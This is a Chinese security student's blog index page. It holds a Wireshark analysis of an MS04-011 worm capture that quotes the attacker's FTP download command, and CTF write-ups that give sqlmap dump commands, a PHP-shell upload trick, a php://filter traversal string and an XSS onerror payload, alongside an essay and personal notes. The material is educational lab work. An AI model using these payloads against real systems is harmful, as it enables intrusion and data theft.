<!doctype html>



  


<html class="theme-next pisces use-motion">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />






<meta property="og:type" content="website">
<meta property="og:title" content="记录这">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="记录这">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="记录这">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> 记录这 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">记录这</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/11/30/机器学习-决策树实现密码强度分析(python)/" itemprop="url">
                  machine learing/决策树实现密码强度评价(python)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-11-30T23:43:56+08:00" content="2016-11-30">
              2016-11-30
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/机器学习做安全/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习做安全</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><h2 id="scikit-learn"><a href="#scikit-learn" class="headerlink" title="scikit -learn"></a>scikit -learn</h2><h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><h3 id="规则定义"><a href="#规则定义" class="headerlink" title="规则定义"></a>规则定义</h3><h3 id="训练集问题"><a href="#训练集问题" class="headerlink" title="训练集问题"></a>训练集问题</h3><h3 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h3>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/11/30/分析所采集的流量样本  还原一次攻击的过程/" itemprop="url">
                  利用wireshark分析攻击流量样本
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-11-30T22:43:56+08:00" content="2016-11-30">
              2016-11-30
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/攻击样本-漏洞分析/" itemprop="url" rel="index">
                    <span itemprop="name">攻击样本/漏洞分析</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>此次分析样本是.pcap格式，共348帧。主要利用的分析工具是wireshark以及它的命令行版本tshark。</p>
<h2 id="前期分析"><a href="#前期分析" class="headerlink" title="前期分析"></a>前期分析</h2><p>首先通过观察，发现只涉及到两个ip，在本文中称98.114.205.102为主机A，192.150.11.111为主机B。<br>如下图，A主动向B请求TCP连接，并完成了三次握手。<br><img src="http://img.blog.csdn.net/20161130230717869" alt="三次握手"><br>虽然不能断定，但很有可能A为攻击者，B为受害者，A攻击的是B的主机系统。</p>
<p>理论上说这种类型的攻击一定利用了已知系统漏洞或者0day，所以接下来的目标是找到A究竟利用了什么漏洞对B实施了攻击。</p>
<p>于是观察有没有能够暴露更多信息的数据帧。如下图，可以看到在第33帧有一个函数被调用。这非常可疑。网上搜一下这个API，很快发现它曾经曝出过问题，编号CVE-2003-0533，winodws上大名鼎鼎的“冲击波”利用的就是这个漏洞，微软给的编号是MS04-011。<br><img src="http://img.blog.csdn.net/20161130231830132" alt="函数调用"></p>
<p>该漏洞是一个远程缓冲区溢出，DCE/RPC请求可以从远程主机发送到本地机的LSASS.EXE进程（Microsoft Windows LSA是本地安全授权服务(LSASRV.DLL)）。LSASS DCE/RPC末端导出的Microsoft活动目录服务存在一个缓冲区溢出，远程攻击者可以利用这个漏洞以SYSTEM权限在系统上执行任意指令。攻击LSASS的漏洞的基本办法，就是构造长参数DomainName，通过DsRoleUpgradeDownlevelServer()这个API，最终造成溢出和返回shell。</p>
<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>已知B被利用的是哪个漏洞，再分析整个流程就简单了。</p>
<p>整个攻击过程中包含5个TCP会话，按会话顺序描述流量样本的攻击流程。<br>（1）首先，A扫描B 445/tcp端口，确认该端口是否开放。（tcp.stream eq 0）<br><img src="http://img.blog.csdn.net/20161130233612156" alt="这里写图片描述"></p>
<p>（2）建立SMB会话，连接到B的\192.150.11.111\ipc$，并请求/lsarpc。（tcp.stream eq 1）<br><img src="http://img.blog.csdn.net/20161130233655844" alt="这里写图片描述"></p>
<p> 如图，在帧33的位置，通过构造恶意参数，调用存在漏洞的函数DsRoleUpgradeDownlevelServer()，<br>造成缓冲区溢出，并将shell绑定到1957端口。<br><img src="http://img.blog.csdn.net/20161130233731844" alt="这里写图片描述"></p>
<p>A连接到B  1957端口上的shell，即可在B上执行指令。（tcp.stream eq 2）<br><img src="http://img.blog.csdn.net/20161130233800000" alt="这里写图片描述"></p>
<p>查看追踪流，可知为了在B上植入恶意软件（蠕虫），A向B发送了如下命令，强制B连接ftp并下载ssms.exe。<br><img src="http://img.blog.csdn.net/20161130233826440" alt="这里写图片描述"></p>
<p>B执行（3）中命令，尝试建立FTP连接，请求下载ssms.exe。（tcp.stream eq 3）<br><img src="http://img.blog.csdn.net/20161130233856298" alt="这里写图片描述"><br>如下图：<br><img src="http://img.blog.csdn.net/20161130233944688" alt="这里写图片描述"></p>
<p>B通过ftp接收文件ssms.exe(恶意样本)。<br><img src="http://img.blog.csdn.net/20161130234030646" alt="这里写图片描述"></p>
<p>追踪流，可见开头MZ、PE字符，显然，正在传输的是windows可执行程序。（tcp.stream eq 4）<br><img src="http://img.blog.csdn.net/20161130234109099" alt="这里写图片描述"></p>
<p>接下来A再次连接到shell，强制B执行恶意文件ssms.exe即可。</p>
<h2 id="疑点分析和结论"><a href="#疑点分析和结论" class="headerlink" title="疑点分析和结论"></a>疑点分析和结论</h2><p>（1）整个攻击实施时间非常短，全过程仅花费16秒；另外，在这五次TCP会话中，出现了会话间间隔小于1秒的情况。人工输入命令的速度不可能这么快，所以说这次攻击肯定是自动化的。<br>另外，恶意文件ssms.exe被mcfee引擎识别为W32/Sdbot.worm.gen.x，是个蠕虫。</p>
<p>（2）攻击者A在发送如下指令时出现了错误：</p>
<blockquote>
<p>echo open 0.0.0.0 8884 &gt; o</p>
</blockquote>
<p>使用了无效的ip，0.0.0.0，该处ip值本应为98.114.205.102。这一错误一方面再次证明此次攻击不是人工实施，人工不会出现这样的错误；另一方面，为何在出错的情况下B仍然执行命令下载了恶意文件ssms.exe？这说明受害者B也是有问题的。</p>
<p>（3）windows xp系统的ttl值应当为128，而这个受害主机B的ttl值为64。进一步证明B实际上是一个蜜罐，伪装成了存在漏洞的windows系统，吸引网络上被感染的发起自动扫描的僵尸机上钩。</p>
<p>综上所述，攻击者A很可能是被蠕虫感染的主机，遭到感染后，利用端口扫描找到受害者B（蜜罐），并向其发起针对MS04-011漏洞的后续攻击行为。整个攻击过程都是自动发起和实施的。</p>
<p>来源和参考：<code>http://www.honeynet.org/node/504</code></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/11/29/为什么说反对可信计算“发展”/" itemprop="url">
                  为什么说反对可信计算“发展”
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-11-29T22:43:56+08:00" content="2016-11-29">
              2016-11-29
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/杂谈/" itemprop="url" rel="index">
                    <span itemprop="name">杂谈</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>可信计算在中国发展是否有用？<br>学号：<br>姓名：</p>
<p>作为一个没有深入研究过可信计算的信息安全专业学生，我不认为可信计算无用，但是对于可信计算目前在中国的“发展”，我是坚决反对的。</p>
<p>目前可信计算正在被广泛的传播和科普，包括我自己在大学的时候，一个普通学生能听到两次院士的演讲还是相当激动的。但不知道其他人有没有同样的感受，可信计算附带的、某些非技术层面的理念实在让人不敢苟同。<strong>我甚至认为这些理念会让不了解信息安全的人们形成错误的观念，导致非常负面的后果。</strong></p>
<p>从可信计算最有力的推动者沈昌祥院士的报告里可以了解到，他认为可信计算达到的效果是“攻击者进不去，非授权者重要信息拿不到，窃取保密信息看不懂，系统和信息篡改不了，系统工作瘫不成，攻击行为赖不掉。我想听到这里，大部分人是不是会理解为，有可信计算，可高枕无忧。</p>
<p>我第一次听沈院士讲座是在省里组织的一场全国比赛的颁奖典礼上，在场的除了我们少数参赛者，其他大部分人是各个不同政府部门派过来听讲座的，连烟草、交通之类的部门都有。<strong>那时候我是从没听说过可信计算的小白</strong>，听完我的感觉就是，虽然不太懂但是好厉害的样子。我不知道那些领导有没有认真听，如果听了，他们得出的结论或许会是信息安全问题没那么严重，这些东西听不懂，跟我们普通人无关，等他们研究出来了我们就安全了。当然网上也有人说，沈院士的观点不能代表其他可信计算研究者。他们所说的也许更谨慎科学，但是院士的影响力就是那么大。</p>
<p>“有了可信计算，网络空间就彻底安全，所以安全是阳春白雪与我们无关的研究”。这真是非常危险的观念。<strong>现实中几千年都没有解决的偷盗问题，放到网络空间中，我们凭什么认为它就会消弭？</strong></p>
<p>且说社会工程学攻击手段。现在APT的概念很火。即使可信计算架构完美实现了，员工非要打开某个邮件附件，非要把密码设置得很简单，或者他是间谍，能是可信计算防的住的吗？</p>
<p>从攻击者的角度，<strong>很多时候攻击根本到不了那么深，在应用实现层面程序员犯过的错已经足够黑客研究了。</strong>如知乎云舒所说，比如说web，直接与用户交互，也是目前最受欢迎的攻击目标。端口扫描不能禁止，它是必要的服务；SQL注入，代码是数据库进程执行的；XSS、CSRF都是在浏览器的进程执行；点击劫持就更不用说了。再说其他应用程序，它总是为要做一些事情而存在的，而且程序员在开发过程中难免出错，只要有功能有输入输出，攻击者就有机可乘。安卓已经实现了所谓的trustzone，但是很多攻击手段并不是它所能覆盖的防护面。普通人认为最糟心的吸费蠕虫，反而在专业人员看来是技术含量最低的，随便一个android开发者都能做。</p>
<p>从可信计算的角度，可信计算基于信任。从初始的信任根到最后的可信应用，每个环节都通过信任链的前一环节验证来确保真实可信，数据是通过信任根-BIOS-引导程序-系统内核-应用层程序这条信任链保证其安全性。如果我的理解没错的话，逆向工作、正版软件的破解工作大概不再有用武之地。</p>
<p>是的，<strong>可信计算是很有必要，但是对于普通人普通企业又不是那么重要。所以，它不需要如此大范围的“发展”。</strong>机要部门首先需要高等级的防护，那么有研究人员首先给他们做就行了，现在的所谓“发展”是没有必要的。</p>
<p>我想之所以出现cyber space一词，就是因为发现网络空间不是那么单一简单的事物，它和我们的生活没有两样。有了保险柜，不代表东西都会放进去，有了防盗门，不代表可以不关窗。</p>
<p>毕竟安全是<strong>权衡</strong>利弊下的选择，且始终会以<strong>攻防</strong>的形式存在。</p>
<p>乔布斯说未来每个人都应学习写代码。而作为安全相关的研究从业者，我们向非专业人员传播的观念应当是进入信息时代，每个人都应提高安全意识，了解计算机相关知识，维护网络空间的安全秩序，<strong>如果想要高级安全服务？那就花钱买。而不是告诉大家，安全我来做，你不用管。</strong></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/11/25/这半年，在半年/" itemprop="url">
                  这半年，再半年
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-11-25T22:43:56+08:00" content="2016-11-25">
              2016-11-25
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/关于我/" itemprop="url" rel="index">
                    <span itemprop="name">关于我</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>研一转眼过去大半了，时间一如既往的快。</p>
<p>以前以为，是因为有圈圈一起愉快的虚度时间，因为总想着学这学那，因为有人约三黑四黑，才显得大学跑得飞快，像是稍纵即逝。现在发现原来自己一个人吃吃睡睡上上课也过得挺快的。每周找找圈圈，偶尔和室友涮火锅，偶尔跟别人组队做个大作业，不像本科憋着劲要写代码，要参加比赛，要搞项目，要出去找个好实习，要奖学金要保研。</p>
<p>回过头想想，那时候想得很多，到最后也没几件事情是真正做好了。所以就这样吧，现在按部就班的感觉也挺好。可能我比以前更懒散了，也可能幸福感不仅会补上心里的洞，还会消磨掉斗志。</p>
<p>上一段坚持写博客的日子还是在大二那次短暂的ACM生涯，是集训队的要求，写的时候不情不愿的，也没啥可读性。但现在看看，至少它证明我曾走过那么一段路吧。而只字未留的后两年时光，是真的遗落在过去了，做过的事踩过的坑都越来越淡，回忆起来就是啊我以前当了好久Android程序员而且几乎就要继续当下去了。人生的选择真是奇妙。</p>
<p>不管怎么说，课结了好几门，又不用回研究所做事，希望自己自律一些，别吃了睡睡了吃，从今天开始坚持每两三天写一篇博客。无论是做了新东西，学到新东西，还是读了国际上相关论文，都记录下来，别忘了。</p>
<p>接下来的半个月，趁着时间没间隔太久，先把之前做的东西写了：</p>
<blockquote>
<ul>
<li>机器学习：利用决策树分析密码强度的python实现</li>
<li>漏洞利用/攻击追溯：一次恶意攻击的流量样本分析总结</li>
<li>Web安全/渗透：过一遍那本白帽子，记录有触动的；kali里自己常用的东西写一下总结。</li>
<li>Python：Flask做网站</li>
<li>CTF：之前刷的有价值的，自己没思路的，或者方便记上的都记上</li>
</ul>
</blockquote>
<p>还没有做但是必须做的事：</p>
<blockquote>
<ul>
<li>系统安全：可信计算赞同or反对  小论文截止12.1</li>
<li>云安全：虚拟化 虚拟机逃逸 同驻攻击 侧信道攻击 云监控</li>
<li>漏洞挖掘：看0day安全软件漏洞分析技术  看别人的poc exp  希望下学期开学前能入门</li>
<li>CTF：继续web，入门逆向</li>
<li>Python：目前想到要尝试写的包括，端口扫描 目录扫描 弱口令 反向shell web服务器 仿openstack云管理平台 常用设计模式实现</li>
<li>渗透：metasploit渗透测试魔鬼训练营  有时间动手过一遍</li>
<li>论文：一周至少翻译一篇顶会，想毕业一定要提高英语水平</li>
</ul>
</blockquote>
<p>希望能做到。希望不要再回首时一片空白。</p>
<p>还有圈圈明天就三年了啊你可能不知道在说远不远说近不近的以前我从未如此强烈的感受到原来我的生活也那么值得被珍惜生而为人真是太好了</p>
<p> three years</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/11/12/CTF考核writeup（1）/" itemprop="url">
                  CTF考核writeup（1）
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-11-12T22:43:56+08:00" content="2016-11-12">
              2016-11-12
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在sql注入、文件上传和文件包含问题上，可以学到一些新思路。</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>观察题目链接，很明显，存在注入的是id。于是利用sqlmap验证，但sqlmap的结果却是“not injectble”：</p>
<p>注意到链接中id值是‘MQ==’。明显参数是经过base64编码的，解码后值为‘1’。</p>
<p>sqlmap中内置了base64编码脚本：</p>
<blockquote>
<p>sqlmap -u “<a href="http://xxx/index.php?id=1" target="_blank" rel="external">http://xxx/index.php?id=1</a>“ - -tamper base64encode.py - -current-db</p>
</blockquote>
<p>发现确实是存在注入的。</p>
<p>接下来用sqlmap，按套路猜解，即可在flag表中找到flag。</p>
<blockquote>
<p>选择一个数据库猜表<br>sqlmap.py -u “–” -D demo –tables<br>选择一个表猜列<br>sqlmap.py -u “–” -D demo -T flag –columns<br>根据列猜数据<br>sqlmap.py -u “–” -D demo -T flag -C value –dump</p>
</blockquote>
<p>关键在于参数被base64编码。tamper目录中各种脚本还是很多的。</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>查看题目，没有找到上传点。</p>
<p>扫了一下目录，发现/upload，看这目录名，一会儿上传的话应该是要传到这个目录下的。</p>
<p>首先想到是不是可以用PUT+COPY，尝试后发现被禁了。</p>
<blockquote>
<p>OPTIONS / HTTP/1.1<br>User-Agent: xxxx<br>Host: xxxx<br>Accept: <em>/</em></p>
</blockquote>
<p>比如PUT</p>
<blockquote>
<p>PUT /test.txt HTTP/1.1<br>User-Agent: xxxx<br>Host: xxxx<br>Accept: <em>/</em></p>
</blockquote>
<p>既然没有上传点，于是自行构造一个form表单。将action指向upload.php。这里还得要猜对name的值为file。再尝试从本地表单上传jpg文件，提交成功，表明此处确实有上传功能。这时会发现一个问题，不知道文件被传到哪儿了。所以在表单中添加一个隐藏域，将“dir”指定为“/upload/”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://--/upload.php&quot; method=&quot;post&quot; enctype= &quot;multipart/form-data&quot;&gt;</div><div class="line">  &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;/p&gt;</div><div class="line">  &lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/upload/&quot;&gt;</div><div class="line">  &lt;input type=&quot;submit&quot;/&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
<p>再次上传jpg文件，成功上传到/upload目录下。接下来开始考虑上传phpshell。</p>
<p>尝试00截断，失败。后来发现内容为空的时候直接上传php文件竟然成功了。</p>
<p>访问，即可回显flag。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>首先尝试能否读上级目录，发现./被过滤为malicious parameter，而/../没有被过滤，所以检测的只是开头有没有.。</p>
<p>这种情况下，利用php伪协议filter，成功包含文件，读取flag。</p>
<blockquote>
<p>php://filter/resource=../flag</p>
</blockquote>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/11/12/CTF考核writeup（2）/" itemprop="url">
                  CTF考核writeup（2）
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-11-12T22:43:56+08:00" content="2016-11-12">
              2016-11-12
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>没有什么，保存下来。主要包括绕过、上传、xss、csrf方面的内容。</p>
<h2 id="0x01-Russian"><a href="#0x01-Russian" class="headerlink" title="0x01 Russian"></a>0x01 Russian</h2><p>利用burpsuite抓包，其他内容都很正常，发现cookie中info项比较可疑，大写小写数字都有，猜测其为base64编码过的字符串。通过Base64在线工具解码字符串，即得到了第一题flag。</p>
<h2 id="0x02-United-States"><a href="#0x02-United-States" class="headerlink" title="0x02 United States"></a>0x02 United States</h2><p>首先，在输入框尝试输入各种内容，系统提示“unless you are root”。于是输入root，弹窗提示“输入无效”。查看源码，发现前端对输入做了限制，而且仅限制了root。</p>
<p>burp绕过前端验证，将参数username的值修改为root。</p>
<p>成功跳转到了新的页面。新页面上提示“localhost（127.0.0.1）only”。</p>
<p>首先考虑到题意可能是限制ip来源，尝试后发现并不是。所以又尝试了修改Refer、Host。最终发现在<code>Host</code>被修改时拿到flag。</p>
<h2 id="0x03-Canada"><a href="#0x03-Canada" class="headerlink" title="0x03 Canada"></a>0x03 Canada</h2><p>打开题目，提示“The form below is protect by Django CSRF MIDDLEWARE”。先尝试点击getflag按钮，提示“Your CSRF token is not what I want. ”。</p>
<p>没有其他线索，先抓包。可以看到提交的参数是csrfmiddlewaretoken，另外cookie里也有一项csrftoken。没有及时截图，实际上第一次抓包的时候这两个值都是一串很长的编码字符串，它们值相等。如果修改其中一个，会报错“CSRF verification failed.”。</p>
<p>为了方便测试，看这两个值被修改的各种效果，我把这个请求放到了repeater模块。找到响应里居然有注释。前面两句代码大概意思是说，如果csrfmiddlewaretoken的值为bypass，那么则返回flag。另外还提到了一个Django的CVE。</p>
<p>看到提示，首先当然会把csrfmiddlewaretoken的值改成bypass，但仅仅这样肯定是无法通过保护机制验证的。实际上到了这里，基本上都能想到把cookie也改了。不过还是先看看<code>cve-2016-7401</code>。</p>
<p>这一漏洞造成的原因是，在某些版本的django中，cookie的解析代码是有问题的。如果这个网站同时采用了google analytics，此时攻击者就可以通过强制设置cookie来绕过csrf保护机制。</p>
<p>这道题的场景里，既然已知‘bypass’，已知漏洞，那就可以通过这种简单方法绕过，从而得到flag。</p>
<h2 id="0x04-China"><a href="#0x04-China" class="headerlink" title="0x04 China"></a>0x04 China</h2><p>随意上传一张图片。从提示看出，上传点对上传的文件类型应该是有一定要求的，而且很有可能要求的是txt、doc之类的。</p>
<p>第一次上传doc文档时未成功，又尝试了其他一些不同类型的文件，仍未上传成功。此时，将exe文件的Content-Type修改为doc文件的application/msword类型时，上传成功了。于是发现，只要Content-Type的值为application/msword，不论什么文件都可以上传成功，对实际类型和后缀都是没有过滤的。而第一次上传doc之所以失败是因为文件太大。</p>
<p>题目已提示考察XSS，首先想到上传文件名是否存在XSS。尝试<code>&lt;script&gt;</code>标签，根据结果可以看出‘/’及其之前的字符都被过滤了。</p>
<p>故想到利用img标签。在filename属性中构造语句：</p>
<blockquote>
<p>“<code>&gt;&lt;image src=1 onerror=alert(&#39;xss&#39;)&gt;</code>“</p>
</blockquote>
<p>由于‘&gt;’将之前的标签闭合，而src不存在，onerror弹窗，成功发起xss攻击。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/08/07/hello-world/" itemprop="url">
                  Hello World
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-08-07T22:53:08+08:00" content="2016-08-07">
              2016-08-07
            </time>
          </span>

          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
